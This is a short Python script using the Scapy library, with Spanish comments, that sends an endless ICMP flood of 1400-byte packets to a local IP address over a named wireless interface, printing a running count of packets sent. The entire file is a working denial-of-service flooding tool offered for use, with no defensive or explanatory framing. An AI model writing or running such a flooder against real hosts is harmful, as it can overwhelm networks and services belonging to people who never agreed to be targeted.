
from scapy.all import *
import time

objetivo = "192.168.1.83"
iface = "wlp0s20f3"  # Cambia por tu interfaz real

# Payload de 1400 bytes (aprox, para no fragmentar)
payload = b"A" * 1400

paquete = IP(dst=objetivo)/ICMP()/payload

contador = 0

print(f"Iniciando flood ICMP a {objetivo} usando interfaz {iface} con paquetes de {len(payload)} bytes de payload...")

while True:
    send(paquete, iface=iface, verbose=0)
    contador += 1
    if contador % 100 == 0:
        print(f"Paquetes enviados: {contador} | Tamaño paquete: {len(paquete)} bytes")
    # Opcional, para no saturar 100% la CPU, puedes poner un pequeño sleep:
    # time.sleep(0.001)

